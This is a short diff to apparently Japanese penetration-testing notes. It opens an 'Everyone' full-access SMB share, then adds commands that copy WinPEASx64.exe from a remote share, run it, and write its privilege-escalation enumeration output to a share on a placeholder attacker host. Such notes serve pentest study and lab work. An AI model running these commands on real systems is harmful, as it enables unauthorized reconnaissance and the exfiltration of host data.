@@ -42,6 +42,12 @@ net share Transfer=C:\PublicShare /grant:Everyone,FULL
 icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
 ```
 
+```sh
+copy \\172.16.104.206\Transfer\WinPEASx64.exe .
+```
+```powershell
+.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
+```
 
 ### 実行結果抽出
 
